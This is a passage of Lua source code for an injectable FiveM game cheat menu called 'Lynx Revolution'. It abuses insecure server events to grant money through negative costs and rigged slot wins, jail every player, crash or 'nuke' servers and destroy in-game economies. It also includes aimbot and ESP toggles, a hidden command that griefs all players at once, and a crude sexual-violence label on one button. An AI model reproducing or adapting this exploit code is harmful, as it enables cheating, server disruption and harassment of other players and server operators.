    e.Display() elseif e.IsMenuOpened(cb) then a5("ESX Triggers for drugs", 0.58, 0.58) if e.Button("~h~~g~Harvest ~g~Weed") then hweed() elseif e.Button("~h~~g~Transform ~g~Weed") then tweed() elseif e.Button("~h~~g~Sell ~g~Weed") then sweed() elseif e.Button("~h~~w~Harvest ~w~Coke") then hcoke() elseif e.Button("~h~~w~Transform ~w~Coke") then tcoke() elseif e.Button("~h~~w~Sell ~w~Coke") then scoke() elseif e.Button("~h~~r~Harvest Meth") then hmeth() elseif e.Button("~h~~r~Transform Meth") then tmeth() elseif e.Button("~h~~r~Sell Meth") then smeth() elseif e.Button("~h~~p~Harvest Opium") then hopi() elseif e.Button("~h~~p~Transform Opium") then topi() elseif e.Button("~h~~p~Sell Opium") then sopi() elseif e.Button("~h~~g~Money Wash") then mataaspalarufe() elseif e.Button("~r~~h~Stop all") then matanumaispalarufe() elseif e.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!", BlowDrugsUp, function(eC) BlowDrugsUp = eC end) then end; e.Display() elseif e.IsMenuOpened(bR) then a5("Basic VRP Triggers", 0.42, 0.42) if e.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("lscustoms:payGarage", {
        costs = -j
    }) end elseif e.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("vrp_slotmachine:server:2", j) end elseif e.Button("~r~~h~VRP ~s~Get driving license") then TriggerServerEvent("dmv:success") elseif e.Button("~r~~h~VRP ~s~Bank Deposit") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("Banca:deposit", j) TriggerServerEvent("bank:deposit", j) end elseif e.Button("~r~~h~VRP ~s~Bank Withdraw ") then local j = KeyboardInput("Enter amount of money", "", 100) if j ~= ""
    then TriggerServerEvent("bank:withdraw", j) TriggerServerEvent("Banca:withdraw", j) end end; e.Display() elseif e.IsMenuOpened(c0) then a5("Fun triggers to play with", 0.30, 0.30) if e.Button("~h~Send Fake Message") then local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 1000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {
        0, 0x99, 255
    }, dT) end end elseif e.Button("~h~~g~ESX ~y~CarThief ~s~TROLL") then aM("~y~esx_carthief ~g~required", true) aM("~g~Trying to send alerts", false) carthieftroll() end; e.Display() elseif e.IsMenuOpened(bU) then a5("This is why ~b~L~p~y~r~n~y~x ~s~is unique", 0.58, 0.58) if e.MenuButton("~h~~p~#~s~ Destroyer Menu", bY) then elseif e.MenuButton("~h~~p~#~s~ All Players Troll", c8) then elseif e.MenuButton("~h~~p~#~s~ ESP Menu", c5) then elseif e.MenuButton("~h~~p~#~s~ Crosshairs", c6) then elseif e.CheckBox("~h~TriggerBot", TriggerBot, function(eC) TriggerBot = eC end) then elseif e.CheckBox("~h~SilentAim/Aimbot", Aimbot, function(eC) Aimbot = eC end) then elseif e.CheckBox("~h~Player Blips", ej, function(ej) end) then ds = not ds; ej = ds elseif e.CheckBox("~h~Name Above Players ~g~v1", dt, function(eC) dt = eC; du = false end) then elseif e.CheckBox("~h~Name Above Players n Indicator ~g~v2", du, function(eC) du = eC; dt = false end) then elseif e.CheckBox("~h~~r~Confirms~s~ MSWITCH", dv, function(eC) dv = eC end) then end; e.Display() elseif e.IsMenuOpened(c6) then a5("Crosshairs modifications", 0.29, 0.29) if e.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(eC) crosshair = eC; crosshairc = false; crosshairc2 = false end) then elseif e.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(eC) crosshair = false; crosshairc = eC; crosshairc2 = false end) then elseif e.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(eC) crosshair = false; crosshairc = false; crosshairc2 = eC end) then end; e.Display() elseif e.IsMenuOpened(c8) then
    if e.Button("~h~~r~Jail~s~ All players") then
    for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("ljail:jailplayer") end elseif e.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif e.Button("~h~~r~Rocket~s~ All players") then cE() elseif e.Button("~h~~r~Rape~s~ All players", "~r~WARNING") then RapeAllFunc() elseif e.Button("~h~~r~Cage~s~ All players") then cG() elseif e.Button("~h~~r~BORGAR~s~ All players") then cA() elseif e.Button("~h~~o~_!_ ~r~CRASH~s~ Everyone~o~ _!_", "~r~WARNING") then cv() elseif e.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(eC) freezeall = eC end) then elseif e.CheckBox("~h~~r~Explode~s~ All players", blowall, function(eC) blowall = eC end) then end;
    e.Display() elseif e.IsMenuOpened(bY) then a5("Many destroy options, silent is ~r~~h~unstable", 0.58, 0.58) if e.Button("~h~~r~Nuke ~s~Server") then nukeserver() elseif e.CheckBox("~h~~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(eC) servercrasherxd = eC end) then elseif e.Button("~h~~g~ESX ~r~Destroy ~b~v2") then esxdestroyv2() elseif e.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then EconomyDy2() elseif e.Button("~h~~r~Rampinator~s~ LOL") then
    for vehicle in EnumerateVehicles() do local eY = CreateObject(-145066854, 0, 0, 0, true, true, true) NetworkRequestControlOfEntity(vehicle) AttachEntityToEntity(eY, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) NetworkRequestControlOfEntity(eY) SetEntityAsMissionEntity(eY, true, true) end end;
    e.Display() elseif e.IsMenuOpened(b_) then a5(";)", 0.29, 0.29) if e.Button("~h~~p~#~s~ nit34byte~r~#~r~0977 ~p~DEV") then aM("~h~~o~Dont click me BAKA!~s~.", false) aM("~h~~o~Nyaooww :3~s~.", false) aM("~h~~o~Very mad now cry qweqwe~s~.", false) elseif e.Button("~h~~p~#~s~ DJSNAKE2~r~#~r~7983 ~p~DEV") then elseif e.Button("~h~~p~#~s~ JonBird~r~#~r~1337 ~p~DEV") then end; e.Display() elseif e.IsMenuOpened(cq) then a5("Weapon list to give yourself", 0.58, 0.58) for eJ, eZ in pairs(bo) do
        if e.
    MenuButton("~h~~p~#~s~ "..eJ, cp) then ek = eZ end end; e.Display() elseif e.IsMenuOpened(cp) then
    for eJ, eZ in pairs(ek) do
        if e.
    MenuButton(eZ.name, cj) then el = eZ end end; e.Display() elseif e.IsMenuOpened(cj) then
    if e.Button("~h~~r~Spawn Weapon") then GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(el.id), 1000, false) end;
    if e.Button("~h~~g~Add Ammo") then SetPedAmmo(GetPlayerPed(-1), GetHashKey(el.id), 5000) end;
    if e.CheckBox("~h~~r~Infinite ~s~Ammo", el.bInfAmmo, function(e_) end) then el.bInfAmmo = not el.bInfAmmo; SetPedInfiniteAmmo(GetPlayerPed(-1), el.bInfAmmo, GetHashKey(el.id)) SetPedInfiniteAmmoClip(GetPlayerPed(-1), true) PedSkipNextReloading(GetPlayerPed(-1)) SetPedShootRate(GetPlayerPed(-1), 1000) end;
    for eJ, eZ in pairs(el.mods) do
        if e.
    MenuButton("~h~~p~#~s~ ~h~~r~> ~s~"..eJ, cn) then em = eZ end end; e.Display() elseif e.IsMenuOpened(cn) then
    for _, eZ in pairs(em) do
        if e.
    Button(eZ.name) then GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(el.id), GetHashKey(eZ.id)) end end; e.Display() elseif e.IsMenuOpened(cm) then a5("Spawn a car in front of you", 0.58, 0.58) for i, f0 in ipairs(bk) do
        if e.
    MenuButton("~h~~p~#~s~ "..f0, ck) then carTypeIdx = i end end; e.Display() elseif e.IsMenuOpened(ck) then
    for i, f0 in ipairs(bl[carTypeIdx]) do
        if e.
    MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..f0, c1) then carToSpawn = i end end; e.Display() elseif e.IsMenuOpened(c1) then
    if e.Button("~h~~r~Spawn Car") then local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)) local veh = bl[carTypeIdx][carToSpawn]
    if veh == nil then veh = "adder"
    end; vehiclehash = GetHashKey(veh) RequestModel(vehiclehash) Citizen.CreateThread(function() local f1 = 0;
        while not HasModelLoaded(vehiclehash) do f1 = f1 + 100;
        Citizen.Wait(100) if f1 > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; e.Display() elseif e.IsMenuOpened(c2) then a5("Be in a car/truck, then spawn any trailer", 0.58, 0.58) if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
    for i, f0 in ipairs(bm) do
        if e.
    MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..f0, cl) then TrailerToSpawn = i end end
    else aM("~h~~w~Not in a vehicle", true) end; e.Display() elseif e.IsMenuOpened(cl) then
    if e.Button("~h~~r~Spawn Car") then local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)) local veh = bm[TrailerToSpawn]
    if veh == nil then veh = "adder"
    end; vehiclehash = GetHashKey(veh) RequestModel(vehiclehash) Citizen.CreateThread(function() local f1 = 0;
        while not HasModelLoaded(vehiclehash) do f1 = f1 + 100;
        Citizen.Wait(100) if f1 > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) local f2 = GetVehiclePedIsUsing(GetPlayerPed(-1)) AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; e.Display() elseif e.IsMenuOpened(ch) then a5("Weapon list to give to the player", 0.58, 0.58) for i = 1, #bn do
        if e.
    Button(bn[i]) then GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(bn[i]), 1000, false, true) end end; e.Display() elseif e.IsMenuOpened(c5) then a5("Extra Sensory Perception menu", 0.34, 0.34) if e.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(eC) esp = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Box", espbox, function(eC) espbox = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(eC) espinfo = eC end) then elseif e.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(eC) esplines = eC end) then end; e.Display() elseif e.IsMenuOpened(c4) then a5("Apply some cool stuff to your car", 0.46, 0.46) local veh = GetVehiclePedIsUsing(PlayerPedId()) if e.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", cg) then elseif e.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", cf) then elseif e.Button("~h~Change Car License Plate") then da() elseif e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(eC) RainbowVeh = eC end) then elseif e.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif e.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(eC) rainbowh = eC end) then end; e.Display() elseif e.IsMenuOpened(cd) then a5("Give your car nitro", 0.46, 0.46) if e.ComboBox("~h~Engine ~r~Power ~s~Booster", ep, en, eo, function(aq, ar) en = aq; eo = ar; SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), eo * 20.0) end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(eC) t2x = eC; t4x = false; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(eC) t2x = false; t4x = eC; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(eC) t2x = false; t4x = false; t10x = eC; t16x = false; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(eC) t2x = false; t4x = false; t10x = false; t16x = eC; txd = false; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = eC; tbxd = false end) then elseif e.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(eC) t2x = false; t4x = false; t10x = false; t16x = false; txd = false; tbxd = eC end) then end; e.Display() end; Citizen.Wait(0) end end) RegisterCommand("chocolate", function(f3, f4, f5) ao() print("^1"..
    "Lynx Revolution injected successfully!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "lynxmenu.com - Cheats and Anti-Lynx") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false)
